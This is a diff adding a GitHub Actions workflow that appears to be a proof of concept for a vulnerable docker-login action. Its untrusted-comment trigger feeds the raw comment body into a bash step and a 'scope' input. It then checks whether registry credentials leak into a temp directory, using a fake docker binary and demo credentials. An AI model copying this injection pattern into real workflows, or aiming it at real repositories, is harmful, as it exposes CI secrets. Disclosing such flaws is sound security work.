@@ -1,0 +1,50 @@
+name: poc-untrusted-comment
+on:
+  issue_comment:
+    types: [created]
+
+jobs:
+  poc:
+    if: ${{ github.event.issue.pull_request && startsWith(github.event.comment.body, '/scope ') }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Parse attacker-controlled scope
+        id: parse
+        shell: bash
+        run: |
+          scope="${{ github.event.comment.body }}"
+          scope="${scope#/scope }"
+          echo "scope=$scope" >> "$GITHUB_OUTPUT"
+
+      - name: Install fake docker
+        shell: bash
+        run: |
+          mkdir -p "$RUNNER_TEMP/bin"
+          cat > "$RUNNER_TEMP/bin/docker" <<'EOF'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          cmd="$1"; shift || true
+          if [ "$cmd" = "login" ]; then
+            cat >/dev/null || true
+            mkdir -p "${DOCKER_CONFIG}"
+            echo '{"auths":{"demo":{"auth":"ZGVtbzpkZW1v"}}}' > "${DOCKER_CONFIG}/config.json"
+          fi
+          exit 0
+          EOF
+          chmod +x "$RUNNER_TEMP/bin/docker"
+          echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"
+
+      - name: Run vulnerable action using comment-derived scope
+        uses: ./
+        with:
+          username: demo
+          password: demo
+          scope: ${{ steps.parse.outputs.scope }}
+          logout: false
+
+      - name: Verify
+        run: |
+          ls -la "$RUNNER_TEMP/leak"
+          cat "$RUNNER_TEMP/leak/config.json"
